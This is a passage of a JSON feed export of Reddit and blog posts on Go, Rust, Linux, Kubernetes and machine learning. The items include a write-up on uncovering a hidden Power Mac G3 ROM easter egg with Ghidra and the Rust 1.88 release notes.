debugging I generally reach for <code>crossplane trace</code> or <code>komoplane</code>. The former is okay, but lacks some interactivity and the latter is not exactly the best match for heavy terminal users. With that, I ended up implementing my own TUI for debugging crossplane: <a href=\"https://github.com/brunoluiz/crossplane-explorer\">crossplane-explorer</a> (very creative name, I know).</p> <p>It provides a terminal based UI (similar to <code>k9s</code>) to interactively explore Crossplane traces, making it easier to navigate, debug and understand objects. Under the hood, it leverages <code>crossplane trace</code> to render the object tree.</p> <p>▶️ Demo GIF: <a href=\"https://github.com/brunoluiz/crossplane-explorer/raw/main/demo.gif\">https://github.com/brunoluiz/crossplane-explorer/raw/main/demo.gif</a></p> <p>🔗 Project URL: <a href=\"https://github.com/brunoluiz/crossplane-explorer\">https://github.com/brunoluiz/crossplane-explorer</a></p> <p>Feel free to drop feedback on the bubbletea app project structure (first time doing one) or other features that might be interesting to be included in a Crossplane TUI tool.</p> <p>EDIT 1: added the full project link</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/brnluiz\"> /u/brnluiz </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1lld2uc/a_tui_to_explore_crossplane_traces/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lld2uc/a_tui_to_explore_crossplane_traces/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Pewdiepie picks a fight against Google, installs GrapheneOS to his phone, he even installs Archlinux into his Steam Deck to host a Linux app","url":"https://www.reddit.com/r/linux/comments/1lld00e/pewdiepie_picks_a_fight_against_google_installs/","date":1750975255,"author":"/u/cryptobread93","guid":172563,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Wow what a year... It&#39;s finally the year of the Linux Desktop! The video is hilarious and a lot of fun.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/cryptobread93\"> /u/cryptobread93 </a> <br/> <span><a href=\"https://i.redd.it/gfwq2be8gc9f1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1lld00e/pewdiepie_picks_a_fight_against_google_installs/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"etcd on arm","url":"https://www.reddit.com/r/kubernetes/comments/1llcysb/etcd_on_arm/","date":1750975173,"author":"/u/jaro1122334455","guid":172559,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello,<br/> I want to use etcd on arm (need to save data from xml to db on embedded device). I tested it at first on x86 and everything works fine, it saves data in ms then I use buildroot to add etc to board (try on raspberry pi 4 and imx 93) and the performance was terrible. It saves data but in 40s so I try use directory in /tmp to save data on ram, this improved situation but not enough (14s).<br/> I would like to ask if using etcd on arm is not optimized or what is the problem.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/jaro1122334455\"> /u/jaro1122334455 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llcysb/etcd_on_arm/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llcysb/etcd_on_arm/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Official /r/rust \"Who's Hiring\" thread for job-seekers and job-offerers [Rust 1.88]","url":"https://www.reddit.com/r/rust/comments/1llcso7/official_rrust_whos_hiring_thread_for_jobseekers/","date":1750974736,"author":"/u/DroidLogician","guid":173848,"unread":true,"content":"<p>Welcome once again to the official <a href=\"https://www.reddit.com/r/rust\">r/rust</a> Who's Hiring thread!</p><p>Before we begin, job-seekers should also remember to peruse the <a href=\"https://www.reddit.com/r/rust/comments/1knkfb6/official_rrust_whos_hiring_thread_for_jobseekers/\">prior thread</a>.</p><p>This thread will be periodically stickied to the top of <a href=\"https://www.reddit.com/r/rust\">r/rust</a> for improved visibility. You can also find it again via the \"Latest Megathreads\" list, which is a dropdown at the top of the page on new Reddit, and a section in the sidebar under \"Useful Links\" on old Reddit.</p><p>The thread will be refreshed and posted anew when the next version of Rust releases in six weeks.</p><p>Please adhere to the following rules when posting:</p><ul><li><p>Don't create top-level comments; those are for employers.</p></li><li><p>Feel free to reply to top-level comments with on-topic questions.</p></li><li><p>Anyone seeking work should reply to my stickied top-level comment.</p></li><li><p>Meta-discussion should be reserved for the distinguished comment at the very bottom.</p></li></ul><ul><li><p><strong>The ordering of fields in the template has been revised to make postings easier to read. If you are reusing a previous posting, please update the ordering as shown below.</strong></p></li><li><p><strong>Remote positions: see bolded text for new requirement.</strong></p></li><li><p>To find individuals seeking work, see the replies to the stickied top-level comment; you will need to click the \"more comments\" link at the bottom of the top-level comment in order to make these replies visible.</p></li><li><p>To make a top-level comment you must be hiring directly; no third-party recruiters.</p></li><li><p>One top-level comment per employer. If you have multiple job openings, please consolidate their descriptions or mention them in replies to your own top-level comment.</p></li><li><p>Proofread your comment after posting it and edit it if necessary to correct mistakes.</p></li><li><p>To share the space fairly with other postings and keep the thread pleasant to browse, we ask that you try to limit your posting to either 50 lines or 500 words, whichever comes first.<strong>We reserve the right to remove egregiously long postings.</strong> However, this only applies to the content of this thread; you can link to a job page elsewhere with more detail if you like.</p></li><li><p>Please base your comment on the following template:</p></li></ul><p>COMPANY: <em>[Company name; optionally link to your company's website or careers page.]</em></p><p>TYPE: <em>[Full time, part time, internship, contract, etc.]</em></p><p>LOCATION: <em>[Where are your office or offices located? If your workplace language isn't English-speaking, please specify it.]</em></p><p>REMOTE: <em>[Do you offer the option of working remotely? <strong>Please state clearly if remote work is restricted to certain regions or time zones, or if availability within a certain time of day is expected or required.</strong>]</em></p><p>VISA: <em>[Does your company sponsor visas?]</em></p><p>DESCRIPTION: <em>[What does your company do, and what are you using Rust for? How much experience are you seeking and what seniority levels are you hiring for? The more details the better.]</em></p><p>ESTIMATED COMPENSATION: <em>[Be courteous to your potential future colleagues by attempting to provide at least a rough expectation of wages/salary. If you are listing several positions in the \"Description\" field above, then feel free to include this information inline above, and put \"See above\" in this field.<p> If compensation is negotiable, please attempt to provide at least a base estimate from which to begin negotiations. If compensation is highly variable, then feel free to provide a range.</p> If compensation is expected to be offset by other benefits, then please include that information here as well. If you don't have firm numbers but do have relative expectations of candidate expertise (e.g. entry-level, senior), then you may include that here.<p> If you truly have no information, then put \"Uncertain\" here.</p> Note that many jurisdictions (including several U.S. states) <strong>require salary ranges on job postings by law</strong>. If your company is based in one of these locations or you plan to hire employees who reside in any of these locations, you are likely subject to these laws.<p> Other jurisdictions may require salary information to be available upon request or be provided after the first interview.</p> To avoid issues, <strong>we recommend all postings provide salary information</strong>. You  state clearly in your posting if you are planning to compensate employees partially or fully in <strong>something other than fiat currency</strong> (e.g. cryptocurrency, stock options, equity, etc). Do  put just \"Uncertain\" in this case as the default assumption is that the compensation will be 100% fiat. Postings that fail to comply with this addendum . Thank you.]</em></p><p>CONTACT: <em>[How can someone get in touch with you?]</em></p>","contentLength":4390,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"PewDiePie self-hosting on his Steam Deck","url":"https://www.reddit.com/r/linux/comments/1llbzy1/pewdiepie_selfhosting_on_his_steam_deck/","date":1750972724,"author":"/u/Youju","guid":172562,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Youju\"> /u/Youju </a> <br/> <span><a href=\"https://i.redd.it/fsbvwtsu8c9f1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1llbzy1/pewdiepie_selfhosting_on_his_steam_deck/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"colorspace - chroma.js, but readable, and in Go","url":"https://www.reddit.com/r/golang/comments/1lla4sm/colorspace_chromajs_but_readable_and_in_go/","date":1750968246,"author":"/u/whittileaks","guid":172466,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1lla4sm/colorspace_chromajs_but_readable_and_in_go/\"> <img src=\"https://external-preview.redd.it/er_cn_T-BL8B1bhKtbq9deFe4xYbJjfhjK7MfpR32VQ.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=c3ff01e55ccddc1bbd2391b0ad8d880985c12149\" alt=\"colorspace - chroma.js, but readable, and in Go\" title=\"colorspace - chroma.js, but readable, and in Go\" /> </a> </td><td> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/whittileaks\"> /u/whittileaks </a> <br/> <span><a href=\"https://github.com/soypat/colorspace\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1lla4sm/colorspace_chromajs_but_readable_and_in_go/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Finding a 27-year-old easter egg in the Power Mac G3 ROM","url":"https://www.downtowndougbrown.com/2025/06/finding-a-27-year-old-easter-egg-in-the-power-mac-g3-rom/","date":1750967765,"author":"/u/NXGZ","guid":172513,"unread":true,"content":"<p>I was recently poking around inside the original Power Macintosh G3’s ROM and accidentally discovered an easter egg that nobody has documented until now.</p><p>This story starts with me on a lazy Sunday using <a href=\"https://hexfiend.com/\" target=\"_blank\" rel=\"noreferrer noopener\">Hex Fiend</a> in conjunction with <a href=\"https://github.com/eharmon/rom_fiend\" target=\"_blank\" rel=\"noreferrer noopener\">Eric Harmon’s Mac ROM template (ROM Fiend)</a> to look through the resources stored in the Power Mac G3’s ROM. This ROM was used in the beige desktop, minitower, and all-in-one G3 models from 1997 through 1999.</p><p>As I write this post in mid-2025, I’m having a really difficult time accepting the fact that the Power Mac G3 is now over 27 years old. Wow!</p><p>While I was browsing through the ROM, two things caught my eye:</p><p>First, there was a resource of type  which contained a JPEG image of a bunch of people, presumably people who worked on these Mac models.</p><p>This wasn’t anything new; <a href=\"https://www.journaldulapin.com/2014/08/19/easter-egg-les-images-cachees-dans-les-roms/\" target=\"_blank\" rel=\"noreferrer noopener\">Pierre Dandumont wrote about it back in 2014</a>. However, in his post, he mentioned that he hadn’t figured out how to display this particular hidden image on the actual machine. Several older Macs have secret keypress combinations to show similar pictures, but the mechanism for displaying this one was a complete mystery.</p><p>The second thing I found was a big clue: I kept looking for other interesting information in the ROM, and eventually I stumbled upon  resource ID 43, named “Native 4.3”. Thanks to <a href=\"https://blitter.net/blog/2021/02/09/pippin-kickstart-1-1/\" target=\"_blank\" rel=\"noreferrer noopener\">Keith Kaisershot’s earlier Pippin research</a>, I was quickly able to conclude that this was the PowerPC-native SCSI Manager 4.3 code. The SCSI Manager wasn’t what piqued my interest about this resource though. At the very end of the data, I found some interesting Pascal strings:</p><p>These strings were definitely intriguing:</p><ul></ul><p>The “secret ROM image” text in particular seemed like it could be related to the picture shown above. I decided to dive deeper to see if I could figure out why the SCSI Manager contained these strings, in the hopes that I could solve the mystery. Would this be the clue I needed in order to figure out how to instruct the Power Mac G3 to display this picture?</p><p>Some quick Internet searching for the phrase “secret ROM image” revealed that <a href=\"https://www.mackido.com/EasterEggs/HW-PCIROM.html\" target=\"_blank\" rel=\"noreferrer noopener\">it had been used for easter eggs with earlier PowerPC Macs</a>. On those machines, you just had to type the text, select it, and drag it to the desktop. Then, the picture would appear. That approach didn’t work on the G3.</p><p>I suspected there was some similar way to access this hidden image, but nobody had documented it, at least not as far as I could find. So I had no choice but to disassemble the code and see where this text was used. What is it with me and all these crazy rabbit holes?</p><p>I extracted the entire  resource ID 43 to a file and inspected it:</p><p>That wasn’t too surprising, considering that the first twelve bytes were “Joy!peffpwpc”. I fed this entire file into <a href=\"https://github.com/NationalSecurityAgency/ghidra\" target=\"_blank\" rel=\"noreferrer noopener\">Ghidra</a>, which immediately recognized it as a PEF file and had no trouble loading it. Although I’m pretty familiar with reading x86 and ARM assembly, I know essentially nothing about PowerPC assembly code. Thankfully, Ghidra’s decompiler worked very well with this file.</p><p>There was one problem, though: it didn’t detect any references to the “secret ROM image” string, other than inside of a huge list of pointers to variables. After scratching my head a little bit, I realized that Ghidra wasn’t doing a great job of finding references to several variables. Luckily, running Auto Analyze a second time after the initial analysis seemed to help it find several more references to things, including all of the strings I was interested in! I didn’t change any options with the analyzer; it just found more stuff on the second run.</p><p>The function that used all of these strings was definitely doing something with the .EDisk driver, which I already knew was the RAM disk driver because of past hackery. It seemed to be using  to see if a string was equal to “secret ROM image”, and if so, it would create/open/write a file named “The Team”.</p><p>I cleaned up this decompilation quite a bit by giving names to variables and figuring out data types. Fortunately, a lot of the functions like  had lots of public documentation, so I just had to tell Ghidra about the various Mac Toolbox structs being used.</p><p>Okay, that’s a lot easier to understand!</p><p>I couldn’t figure out how to format the 32-bit function arguments such as 0x48504f45 into four-letter codes like , so that’s what the comments are. Ghidra simply wouldn’t let me display them as ASCII in the decompilation no matter what I did, even though hovering over the constant showed a tooltip with the equivalent text. This is easy to do in IDA, but I couldn’t figure out how to convince Ghidra to do it. I tried Set Equate, but it didn’t change anything. If someone knows how to make it work, I’d love to hear how!</p><p>Anyway, the decompiled code shown above makes sense, and here’s a summary of what it does:</p><ul><li>It looks for a driver called .Edisk. (The driver is really named .EDisk, but I guess Mac OS doesn’t care about case sensitivity for this.)</li><li>It finds a disk associated with that driver (the RAM disk).</li><li>It looks for a volume associated with that disk.</li><li>If the volume is named “secret ROM image”:\n<ul><li>It loads  resource ID 1, which contains the JPEG image data.</li><li>It creates a file of creator  and type  called “The Team”.</li><li>It opens the file, writes the JPEG data to it, and closes it.</li><li>Then it does something with the driver control entry that I didn’t bother trying to understand further.</li></ul></li></ul><p>Okay, interesting! So this code was clearly looking for the RAM disk to be named “secret ROM image”, but I wasn’t sure exactly how to trigger it. This function was only ever called in one other place: another function, which was checking to see if its first argument was equal to the value 0x3DA (decimal 986).</p><p>I didn’t have my beige G3 handy for tinkering, so instead, I mentioned what I had discovered in #mac68k on Libera. <a href=\"https://infosec.exchange/@atax1a/114729277160021527\" target=\"_blank\" rel=\"noreferrer noopener\">^alex came to the rescue</a> after playing around in Infinite Mac with the hints I had given. They quickly figured out that the trick was to format the RAM disk, and type the special text into the format dialog:</p><ul><li>Enable the RAM Disk in the Memory control panel.</li><li>Choose Restart from the Special menu.</li><li>After the desktop comes back up, select the RAM Disk icon.</li><li>Choose Erase Disk from the Special menu.</li><li>Type the  text exactly as depicted above.</li></ul><p>When you open the newly-formatted RAM disk, you should see a file named “The Team”:</p><p>If you double-click the file, SimpleText will open it:</p><p>As far as I have been able to determine, this particular secret was undiscovered until now. People definitely knew the image was there in the ROM, but nobody had figured out how to actually activate it. This is probably one of the last easter eggs that existed in the Mac prior to <a href=\"https://gizmodo.com/the-easter-eggs-are-back-in-os-x-and-this-one-is-insane-5929286\" target=\"_blank\" rel=\"noreferrer noopener\">Steve Jobs reportedly banning them in 1997 when he returned to Apple</a>. I wonder if he ever knew about this one?</p><p>Special thanks to ^alex for figuring out that the RAM Disk needed to be erased in order to activate the easter egg! I’m not sure I would have thought to try that, and it would have taken a lot more work to trace through the rest of the code to figure it out.</p><p>If you are reading this post and you were on “The Team”, I’d love to hear about it! I’m curious if anyone who worked at Apple in the era remembers this little secret.</p>","contentLength":7249,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1ll9xe5/finding_a_27yearold_easter_egg_in_the_power_mac/"},{"title":"Associated traits will bring Rust 1 step closer to having higher-kinded types","url":"https://www.reddit.com/r/rust/comments/1ll9swo/associated_traits_will_bring_rust_1_step_closer/","date":1750967466,"author":"/u/nikitarevenco","guid":172606,"unread":true,"content":"<p>The  trait is an abstraction for the  function which is commonly seen on , , .</p><p><code>impl Functor for Collection</code> would mean you can get from a  to  by calling  and supplying a closure with type .</p><p> requires higher-kinded types, as you cannot implement traits on collections directly. However, we can think of a workaround by using generic associated types:</p><p>```rust trait Functor&lt;A&gt; { type Collection&lt;T&gt;;</p><pre><code>fn fmap&lt;B, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt;; </code></pre><p>In the above, the  in  represents the input, and  represents the output.  is a generic associated type representing the collection.</p><p>Here's how you could implement it for a  in stable Rust today:</p><p>```rust impl&lt;A&gt; Functor&lt;A&gt; for Vec&lt;A&gt; { type Collection&lt;T&gt; = Vec&lt;T&gt;;</p><pre><code>fn fmap&lt;B, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt; { self.into_iter().map(f).collect() } </code></pre><p>It works for , but if you try to implement it for a , you'll run into a problem:</p><p>```rust impl&lt;A: Hash + Eq&gt; Functor&lt;A&gt; for HashSet&lt;A&gt; { type Collection&lt;T&gt; = HashSet&lt;T&gt;;</p><pre><code>fn fmap&lt;B, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt; { self.into_iter().map(f).collect() } </code></pre><p>In order for the above code to compile,  needs to be  as <code>HashSet&lt;T&gt; where T: Hash + Eq</code>.</p><p>If you try to add this constraint to B, you won't be able to because the signature of  in the  definition and  will be mismatched:</p><p>```rust // trait Functor&lt;A&gt; fn fmap&lt;B, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt;</p><p>// impl&lt;A: Hash + Eq&gt; Functor&lt;A&gt; for HashSet&lt;A&gt; fn fmap&lt;B: Hash + Eq, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt; ```</p><p>How do this solve this? Creating the  trait in today's rust is not possible due to the above limitations. Rust does not have \"higher-kinded\" types.</p><p>However, with a natural extension to the language we can think about the \"associated trait\" feature that would fit into Rust.</p><p>This feature will allow you to write a  bound inside of a , which the implementor will need to fill. It is similar to the \"associated types\".</p><p>With associated traits, we can define the  trait as follows:</p><p>```rust trait Functor&lt;A&gt; { type Collection&lt;T&gt;; trait Constraint;</p><pre><code>fn fmap&lt;B: Self::Constraint, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt;; </code></pre><p>In the above, we declare a  which will need to be provided by the implementor of the caller.</p><p>The generic  now must satisfy the bound. . This allows us to implement  for :</p><p>```rust impl&lt;A: Hash + Eq&gt; Functor&lt;A&gt; for HashSet&lt;A&gt; { type Collection&lt;T&gt; = HashSet&lt;T&gt;; trait Constraint = Hash + Eq;</p><pre><code>fn fmap&lt;B: Self::Constraint, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt; { self.into_iter().map(f).collect() } </code></pre><p>Both  and , so this code will compile.</p><p>The  does not need to provide any constraint, but it must be included. In  the  has no trait constraints. How do we work around this?</p><p>Define a  trait which is implemented for all types:</p><p><code>rust trait AnyType {} impl&lt;T&gt; AnyType for T </code></p><p>This allows us to implement  for  again:</p><p>```rust impl&lt;A&gt; Functor&lt;A&gt; for Vec&lt;A&gt; { type Collection&lt;T&gt; = Vec&lt;T&gt;; trait Constraint = AnyType;</p><pre><code>fn fmap&lt;B: Self::Constraint, F: Fn(A) -&gt; B&gt;(self, f: F) -&gt; Self::Collection&lt;B&gt; { self.into_iter().map(f).collect() } </code></pre><p>Because the  associated trait is implemented for all types,  is identical to . It is a bit wordier, but it gives us the flexibility of implementing the  trait for any type.</p><p>Effectively, this gives us higher-kinded types in Rust. When you see <code>impl&lt;A&gt; Functor&lt;A&gt; for Vec&lt;A&gt;</code>,  is the  type.</p><p>If you want to learn more about this feature, as well as extra use-cases, check out the <a href=\"https://github.com/rust-lang/rfcs/issues/2190\">issue</a>! There is currently no RFC to add it.</p>","contentLength":3465,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Ubuntu Maker Canonical Generated Nearly $300M In Revenue Last Year","url":"https://www.reddit.com/r/linux/comments/1ll83c5/ubuntu_maker_canonical_generated_nearly_300m_in/","date":1750963388,"author":"/u/navi0540","guid":172431,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/navi0540\"> /u/navi0540 </a> <br/> <span><a href=\"https://www.phoronix.com/news/Canonical-2024-Annual-Report\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll83c5/ubuntu_maker_canonical_generated_nearly_300m_in/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The New EULaptops Linux Default Desktop Experience!","url":"https://www.reddit.com/r/linux/comments/1ll7ye0/the_new_eulaptops_linux_default_desktop_experience/","date":1750963057,"author":"/u/EveYogaTech","guid":172432,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>More at <a href=\"/r/EULaptops\">r/EULaptops</a> </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/EveYogaTech\"> /u/EveYogaTech </a> <br/> <span><a href=\"https://i.redd.it/lci7fz91gb9f1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1ll7ye0/the_new_eulaptops_linux_default_desktop_experience/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Rust 1.88.0 is out","url":"https://blog.rust-lang.org/2025/06/26/Rust-1.88.0/","date":1750961721,"author":"/u/manpacket","guid":172428,"unread":true,"content":"<p>The Rust team is happy to announce a new version of Rust, 1.88.0. Rust is a programming language empowering everyone to build reliable and efficient software.</p><p>If you have a previous version of Rust installed via , you can get 1.88.0 with:</p><p>If you'd like to help us out by testing future releases, you might consider updating locally to use the beta channel () or the nightly channel (). Please <a href=\"https://github.com/rust-lang/rust/issues/new/choose\">report</a> any bugs you might come across!</p><p>This feature allows -chaining  statements inside  and  conditions, even intermingling with boolean expressions, so there is less distinction between / and /. The patterns inside the  sub-expressions can be irrefutable or refutable, and bindings are usable in later parts of the chain as well as the body.</p><p>For example, this snippet combines multiple conditions which would have required nesting  and  blocks before:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Let chains are only available in the Rust 2024 edition, as this feature depends on the <a href=\"https://doc.rust-lang.org/edition-guide/rust-2024/temporary-if-let-scope.html\"> temporary scope</a> change for more consistent drop order.</p><p>Earlier efforts tried to work with all editions, but some difficult edge cases threatened the integrity of the implementation. 2024 made it feasible, so please upgrade your crate's edition if you'd like to use this feature!</p><p>Rust now supports writing naked functions with no compiler-generated epilogue and prologue, allowing full control over the generated assembly for a particular function. This is a more ergonomic alternative to defining functions in a  block. A naked function is marked with the  attribute, and its body consists of a single  call.</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>The handwritten assembly block defines the  function body: unlike non-naked functions, the compiler does not add any special handling for arguments or return values. Naked functions are used in low-level settings like Rust's <a href=\"https://github.com/rust-lang/compiler-builtins\"></a>, operating systems, and embedded applications.</p><p>Look for a more detailed post on this soon!</p><p>The  predicate language now supports boolean literals,  and , acting as a configuration that is always enabled or disabled, respectively. This works in Rust <a href=\"https://doc.rust-lang.org/reference/conditional-compilation.html\">conditional compilation</a> with  and  attributes and the built-in  macro, and also in Cargo  tables in both <a href=\"https://doc.rust-lang.org/cargo/reference/config.html#target\">configuration</a> and <a href=\"https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#platform-specific-dependencies\">manifests</a>.</p><p>Previously, empty predicate lists could be used for unconditional configuration, like  for enabled and  for disabled, but this meaning is rather implicit and easy to get backwards.  and  offer a more direct way to say what you mean.</p><h3><a href=\"https://blog.rust-lang.org/2025/06/26/Rust-1.88.0/#cargo-automatic-cache-cleaning\" aria-hidden=\"true\"></a>\nCargo automatic cache cleaning</h3><p>Starting in 1.88.0, Cargo will automatically run garbage collection on the cache in its home directory!</p><p>When building, Cargo downloads and caches crates needed as dependencies. Historically, these downloaded files would never be cleaned up, leading to an unbounded amount of disk usage in Cargo's home directory. In this version, Cargo introduces a garbage collection mechanism to automatically clean up old files (e.g.  files). Cargo will remove files downloaded from the network if not accessed in 3 months, and files obtained from the local system if not accessed in 1 month. Note that this automatic garbage collection will not take place if running offline (using  or ).</p><p>Cargo 1.78 and newer track the access information needed for this garbage collection. This was introduced well before the actual cleanup that's starting now, in order to reduce cache churn for those that still use prior versions. If you regularly use versions of Cargo even older than 1.78, in addition to running current versions of Cargo, and you expect to have some crates accessed exclusively by the older versions of Cargo and don't want to re-download those crates every ~3 months, you may wish to set <code>cache.auto-clean-frequency = \"never\"</code> in the Cargo configuration, as described in the <a href=\"https://doc.rust-lang.org/nightly/cargo/reference/config.html#cache\">docs</a>.</p><p>For more information, see the original <a href=\"https://blog.rust-lang.org/2023/12/11/cargo-cache-cleaning/\">unstable announcement</a> of this feature. Some parts of that design remain unstable, like the  subcommand tracked in <a href=\"https://github.com/rust-lang/cargo/issues/13060\">cargo#13060</a>, so there's still more to look forward to!</p><p>These previously stable APIs are now stable in const contexts:</p><p>The  target has been demoted to Tier 2, as mentioned in an <a href=\"https://blog.rust-lang.org/2025/05/26/demoting-i686-pc-windows-gnu/\">earlier post</a>. This won't have any immediate effect for users, since both the compiler and standard library tools will still be distributed by  for this target. However, with less testing than it had at Tier 1, it has more chance of accumulating bugs in the future.</p><p>Many people came together to create Rust 1.88.0. We couldn't have done it without all of you. <a href=\"https://thanks.rust-lang.org/rust/1.88.0/\">Thanks!</a></p>","contentLength":4369,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1ll7e0m/rust_1880_is_out/"},{"title":"Gateway Api without real ip in the logs","url":"https://www.reddit.com/r/kubernetes/comments/1ll6v5n/gateway_api_without_real_ip_in_the_logs/","date":1750960522,"author":"/u/Jeremymr2","guid":172356,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hello Kubernetes community!</p> <p>I&#39;m starting this adventure in the world of Kubernetes, and I&#39;m currently building a cluster where it will be the future testing environment, if all goes well.</p> <p>For now, I have the backend and frontend configured as service clusterip. I have the metallb that exposes a Traefik Gatewayapi.</p> <p>I managed to connect everything successfully, but the problem that arose was that the Traefik logs showed the IP from &#39;10.244.1.1&#39; and not the real IP of the user who was accessing the service.</p> <p>Does anyone know how I could fix this? Is there no way to do it?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Jeremymr2\"> /u/Jeremymr2 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll6v5n/gateway_api_without_real_ip_in_the_logs/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1ll6v5n/gateway_api_without_real_ip_in_the_logs/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] EMNLP 2025 Paper Reviews","url":"https://www.reddit.com/r/MachineLearning/comments/1ll6nsq/d_emnlp_2025_paper_reviews/","date":1750960053,"author":"/u/Final-Tackle7275","guid":172698,"unread":true,"content":"<p>Reviews are released! Lets have fun and discuss them here!</p>","contentLength":58,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Can I just be grateful for Rust?","url":"https://www.reddit.com/r/rust/comments/1ll6g5y/can_i_just_be_grateful_for_rust/","date":1750959573,"author":"/u/RubenTrades","guid":172427,"unread":true,"content":"<p>Rust changed my life in the same way that C++ did many years ago when i was a teenager turning my school into a 3D game. Can I just express my gratitude to everyone on this sub?</p><p>When I have a project that doesn't involve Rust, I get a little disappointed. An App I rebuilt in Rust went from constant choke downs before to being faster than the front-end!</p><p>You all seem way smarter than I am and I don't understand half the stuff you guys discuss since many of you guys are developing the very language itself.</p><p>I know that positivity isn't always normal on Reddit, but I just wanted to extend a heart-felt thank-you to you guys, to the entire Rust ecosystem, to veterans and newbies alike. What you do, alone, behind your computer, others see it and appreciate it--I sure do.</p><p>Rust is FAST and the community is SMART &amp; largely positive. Just a joy to be part of. I keep discovering new things about Rust that make me smile like \"Ooooh that's well-designed\", like being on a car show and marveling at the designs. </p><p>Anyone else feel the same? Here's to 10 more years of innovation 🍻 </p>","contentLength":1076,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] You can just predict the optimum (aka in-context Bayesian optimization)","url":"https://www.reddit.com/r/MachineLearning/comments/1ll69g0/r_you_can_just_predict_the_optimum_aka_incontext/","date":1750959146,"author":"/u/emiurgo","guid":172608,"unread":true,"content":"<p>I wanted to share a blog post about our recent AISTATS 2025 paper on using Transformers for black-box optimization, among other things.</p><p>TL;DR: We train a Transformer on millions of synthetically generated (function, optimum) pairs. The trained model can then predict the optimum of a new, unseen function in a single forward pass. The blog post focuses on the key trick: how to efficiently generate this massive dataset.</p><p>Many of us use Bayesian Optimization (BO) or similar methods for expensive black-box optimization tasks, like hyperparameter tuning. These are iterative, sequential processes. We had an idea inspired by the power of in-context learning shown by transformer-based meta-learning models such as Transformer Neural Processes (TNPs) and Prior-Fitted Networks (PFNs): what if we could frame optimization (as well as several other machine learning tasks) as a massive prediction problem?</p><p>For the optimization task, we developed a method where a Transformer is pre-trained to learn an implicit \"prior\" over functions. It observes a few points from a new target function and directly outputs its prediction as a distribution over the location and value of the optimum. This approach is also known as \"amortized inference\" or meta-learning.</p><p>The biggest challenge is getting the (synthetic) data. How do you create a huge, diverse dataset of functions and their known optima to train the Transformer?</p><p>The method for doing this involves sampling functions from a Gaussian Process prior in such a way that we know where the optimum is and its value. This detail was in the appendix of our paper, so I wrote the blog post to explain it more accessibly. We think it’s a neat technique that could be useful for other meta-learning tasks.</p>","contentLength":1739,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What is OpenTelemetry? [not in a nutshell] 